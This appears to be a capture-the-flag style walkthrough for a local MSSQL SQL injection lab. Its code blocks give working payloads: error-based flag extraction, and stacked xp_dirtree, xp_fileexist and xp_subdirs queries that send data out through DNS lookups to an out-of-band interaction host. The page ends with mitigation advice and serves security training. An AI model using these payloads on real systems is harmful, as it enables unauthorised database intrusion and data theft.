<h4>Step 1: Understand the Challenge</h4>
<p>
    The search always returns <strong>"Search complete."</strong> regardless of input.
    No data is displayed, and WAITFOR is blocked by keyword filter. The intended technique
    is <strong>Out-of-Band (OOB)</strong> via DNS using <code>xp_dirtree</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=bug"<br>
        <span class="prompt">Input: </span>bug<br>
        <span class="prompt">SQL: </span>SELECT * FROM tickets WHERE title LIKE '%bug%'<br>
        <span class="prompt">Response: </span><strong>Search complete.</strong> (always the same)<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "q='; WAITFOR DELAY '0:0:2' -- -"<br>
        <span class="prompt">Input: </span>'; WAITFOR DELAY '0:0:2' -- -<br>
        <span class="prompt">Response: </span><strong>Blocked keyword detected.</strong> (WAITFOR is filtered)
    </div>
</div>

<h4>Step 2: Confirm Error-Based Fallback</h4>
<p>In this lab, errors are displayed as a fallback channel. In a real OOB scenario, errors would be hidden too.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error-Based Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_xp_d1rtr33_dns}' to data type int.</strong>
    </div>
</div>

<h4>Step 3: Set Up DNS Listener</h4>
<p>For OOB exfiltration, set up a DNS listener to capture incoming queries:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. DNS Listener Setup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>sudo tcpdump -i eth0 port 53<br>
        <span class="prompt"># </span>Or use Burp Collaborator / interactsh-client:<br>
        <span class="prompt">$ </span>interactsh-client
    </div>
</div>

<h4>Step 4: xp_dirtree OOB Test</h4>
<p>Trigger a DNS lookup via UNC path resolution:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4: xp_dirtree DNS Trigger</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; EXEC xp_dirtree '\\test.xxxxx.oast.fun\share'; -- -<br>
        <span class="prompt">Response: </span>Search complete. (stacked query executes silently)<br>
        <span class="prompt">DNS: </span>Check listener for: <strong>test.xxxxx.oast.fun</strong>
    </div>
</div>

<h4>Step 5: Exfiltrate Data via DNS Subdomain</h4>
<p>Embed the flag value into the UNC hostname:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Data Exfiltration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'; DECLARE @d VARCHAR(100); SELECT @d=(SELECT TOP 1 flag FROM flags); EXEC('xp_dirtree "\\' + @d + '.xxxxx.oast.fun\x"'); -- -<br><br>
        <span class="prompt">DNS listener captures: </span><strong>FLAG{ms_xp_d1rtr33_dns}.xxxxx.oast.fun</strong><br><br>
        <span class="prompt">// Handle special chars in DNS labels:</span><br>
        <span class="prompt">Input: </span>'; DECLARE @d VARCHAR(100); SELECT @d=REPLACE(REPLACE(REPLACE((SELECT TOP 1 flag FROM flags),'{','-'),'}','-'),'_','-'); EXEC('xp_dirtree "\\' + @d + '.xxxxx.oast.fun\x"'); -- -
    </div>
</div>

<h4>Step 6: Alternative OOB Procedures</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Other UNC Triggers</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// xp_fileexist:</span><br>
        <span class="prompt">Input: </span>'; EXEC xp_fileexist '\\data.xxxxx.oast.fun\share\test'; -- -<br><br>
        <span class="prompt">// xp_subdirs:</span><br>
        <span class="prompt">Input: </span>'; EXEC xp_subdirs '\\data.xxxxx.oast.fun\share'; -- -
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_xp_d1rtr33_dns}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Error-Based Quick Solve</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab11" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_xp_d1rtr33_dns}' to data type int.</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's extended stored procedures (<code>xp_dirtree</code>,
    <code>xp_fileexist</code>, <code>xp_subdirs</code>) trigger UNC path resolution, generating
    DNS/SMB traffic to attacker-controlled servers. By embedding stolen data into the hostname
    subdomain, attackers can exfiltrate data even with no in-band output. This works when errors
    are hidden and time-based techniques are blocked. Block outbound SMB (445) and restrict
    DNS egress to mitigate. Disable unused extended stored procedures.
</div>
